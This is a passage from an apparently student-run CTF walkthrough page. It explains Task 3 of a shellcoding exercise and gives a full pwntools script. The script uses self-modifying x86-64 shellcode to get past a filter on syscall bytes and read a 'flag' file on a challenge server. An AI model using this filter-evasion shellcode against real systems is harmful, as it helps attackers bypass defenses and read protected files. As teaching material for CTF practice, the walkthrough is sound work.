+<span class=n>pause</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>readrepeat</span><span class=p>())</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Here&rsquo;s the solution already implemented in &lsquo;boilerplate.py&rsquo;</p>
+<h2 id=task-3>Task 3</h2>
+<p>Same procedure used with the first two challenges, we edit the port value in &lsquo;boilerplate.py&rsquo; and navigate to the target webpage. This time we notice that the stdin bytes are back to 0x1000 but there is new text that states that now syscalls in all their forms are filtered out before, and only before, runtime. The filter only looks for the specific bytes of syscall (0x0f05), sysenter(0x0f34) and int (0x80).
+There are also other lines which contiain helpful hints to solve this challenge.
+The answer of this challenge lies in how syscalls are actually executed. I we look at the output of the previous challenge:
+<img class=lazyload src=/svg/loading.min.svg data-src=images/stdout_of_exec_shellcode.png data-srcset="/posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_of_exec_shellcode.png, images/stdout_of_exec_shellcode.png 1.5x, /posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_of_exec_shellcode.png 2x" data-sizes=auto alt=/posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_of_exec_shellcode.png title="Screenshot of the executed shellcode"></p>
+<p>We notice that &ldquo;syscall&rdquo; is nothing more than two bytes (0x0f and 0x05) loaded one after the other.
+This is confirmed by the fact that if we substitute &ldquo;syscall&rdquo; with &ldquo;.byte 0x0f, 0x05&rdquo; in the previous challenge, we will obtain the same results.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>inc</span> <span class=no>byte</span> <span class=no>ptr</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=no>evil</span><span class=err>+</span><span class=mi>1</span><span class=p>]</span>
+<span class=nf>inc</span> <span class=no>byte</span> <span class=no>ptr</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=no>evil</span><span class=p>]</span>
+
+<span class=nl>evil:</span>
+<span class=na>.byte</span> <span class=mi>0x0e</span>
+<span class=na>.byte</span> <span class=mi>0x04</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The previous code is an effective substitute of syscall: it creates a label called &ldquo;evil&rdquo; which contains two bytes, 0x0e and 0x04.
+Before this label is actually run we increase by 1 the values of 0x0e and 0x04 which will now be 0x0f and 0x05. By doing this we have bypassed the filtered imposed by the challenge by creating a <code>self-modifying shellcode</code>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+<span class=c1>#context.log_level = debug</span>
+
+<span class=k>def</span> <span class=nf>print_clean</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
+        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;latin-1&#34;</span><span class=p>))</span>
+
+<span class=c1># shellcode goes here</span>
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>
+</span><span class=s2>.global _start
+</span><span class=s2>.intel_syntax noprefix
+</span><span class=s2>
+</span><span class=s2>_start:
+</span><span class=s2>
+</span><span class=s2>lea rdi, [rip+flag]
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, 2
+</span><span class=s2>
+</span><span class=s2>inc byte ptr [rip+evil+1]
+</span><span class=s2>inc byte ptr [rip+evil]
+</span><span class=s2>
+</span><span class=s2>evil:
+</span><span class=s2>.byte 0x0e
+</span><span class=s2>.byte 0x04
+</span><span class=s2>
+</span><span class=s2>
+</span><span class=s2>mov rdi, 1
+</span><span class=s2>mov rsi, rax
+</span><span class=s2>mov rdx, 0
+</span><span class=s2>mov r10, 60
+</span><span class=s2>mov rax, 40
+</span><span class=s2>
+</span><span class=s2>inc byte ptr [rip+evil+1]
+</span><span class=s2>inc byte ptr [rip+evil]
+</span><span class=s2>
+</span><span class=s2>evil:
+</span><span class=s2>.byte 0x0e
+</span><span class=s2>.byte 0x04
+</span><span class=s2>
+</span><span class=s2>
+</span><span class=s2>flag:
+</span><span class=s2>  .string &#34;flag&#34;
+</span><span class=s2>
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;0.cloud.chals.io&#34;</span><span class=p>,</span> <span class=mi>0000</span><span class=p>)</span>
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Reading 0x1000 bytes from stdin.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>readrepeat</span><span class=p>())</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Here&rsquo;s the solution already implemented in &lsquo;boilerplate.py&rsquo;</p>
+<h2 id=conclusion>Conclusion</h2>
+<p>We hope this explanation on how to solve the three challenges was helpful (and not too verbose!). If something is still obscure to you, you can ask a question on the discord server or comment below and we will try to answer in a timely manner.</p>
+</div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Updated on 2021-11-07&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/9787702a644fffa8cd5378ff024b3d8e5e7d7528 target=_blank title="commit by Mattia(dona@localhost.localdomain) 9787702a644fffa8cd5378ff024b3d8e5e7d7528: Renamed images and folder, small changes to index.md">
+<i class="fas fa-hashtag fa-fw"></i>9787702</a></span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/posts/2021_assembly_and_shellcoding_walkthrough/index.md target=_blank>Read Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/assembly/>assembly</a>,&nbsp;<a href=/tags/shellcode/>shellcode</a>,&nbsp;<a href=/tags/ctf/>CTF</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
+</section>
+</div>
+<div class=post-nav><a href=/posts/2021_shellcode_challenges_walkthrough/ class=prev rel=prev title="Walkthrough: Shellcoding Challenges"><i class="fas fa-angle-left fa-fw"></i>Walkthrough: Shellcoding Challenges</a></div>
+</div>
+<div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong>
+<noscript>
+Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
+</html>
